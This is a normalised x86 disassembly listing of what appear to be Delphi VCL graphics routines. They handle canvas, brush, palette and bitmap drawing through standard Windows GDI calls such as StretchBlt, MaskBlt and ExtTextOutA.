push sub_41cdb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c218
xor eax eax
push ebp
push sub_41cd93
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bc10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd9a
mov eax [ ebp - 0x8 ]
call sub_41c228
retn
sub_41cdc8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41cde4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c218
xor eax eax
push ebp
push sub_41ce29
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bb98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce30
mov eax [ ebp - 0x4 ]
call sub_41c228
retn
sub_41ce34
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41cde4
add esp 0x10
pop edi
pop esi
retn
sub_41ce60
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cdc8
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41cde4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41ce94
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b9ec
xor edx edx
push ebp
push sub_41cf61
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b9f8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c1d4
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41cf7c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cdc8
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41cde4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41cfb0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4c0
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d870
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c9ec
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d890
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ccb8
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41d8b0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413cac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41d074
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413d48
xor edx edx
mov eax esi
call sub_41d6a8
mov eax [ esi + 0xc ]
call sub_40326c
mov eax [ esi + 0x10 ]
call sub_40326c
mov eax [ esi + 0x14 ]
call sub_40326c
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41d0d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d6fc
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d158
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov eax [ ebx + 0x14 ]
call sub_41ce58
call sub_41c1d4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412594
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d204
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov eax [ ebx + 0x14 ]
call sub_41ce94
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d240
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov eax [ ebx + 0x14 ]
call sub_41ce94
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d27c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d2dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d308
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d350
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d38c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41d628
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41d3b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov eax ebx
call sub_41d38c
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_40427c
push eax
mov eax esi
call sub_40447c
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41d488
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d2dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41d488
inc eax
add edi eax
sub_41d444
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40427c
push eax
mov eax edi
call sub_40447c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d488
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d444
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d4a4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d444
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d4c4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d510
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d517
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d2b4
sub_41d570
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41d594
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d2dc
pop ecx
pop edx
pop edi
pop esi
retn
sub_41d5b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41d5e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d6fc
mov eax [ ebp + 0x8 ]
call sub_41c1d4
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d648
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41d6a8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41d648
mov edx esp
mov eax ebx
call sub_41d570
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d594
sub_41d6fc
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41d798
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
test bl 0x8
je r-xdata
mov eax esi
call sub_41d7c4
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41d7f4
sub_41d798
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41c6a8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41d7c4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41cba8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41d7f4
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41ce94
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41ce94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41cf74
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41ce58
call sub_41c1d4
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41ce58
call sub_41c1d4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41d924
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41d96e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d975
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_41d978
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41da14
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41d924
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_40422c
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da1b
lea eax [ ebp - 0x104 ]
call sub_403fbc
retn
sub_41da30
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41db7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41daed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41d978
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41d978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db85
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41db90
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41dbc4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41de44
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41da20
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de4b
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41da20
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41dc97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406974
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de4b
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41de58
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41de90
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c88
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41df08
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41df60
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
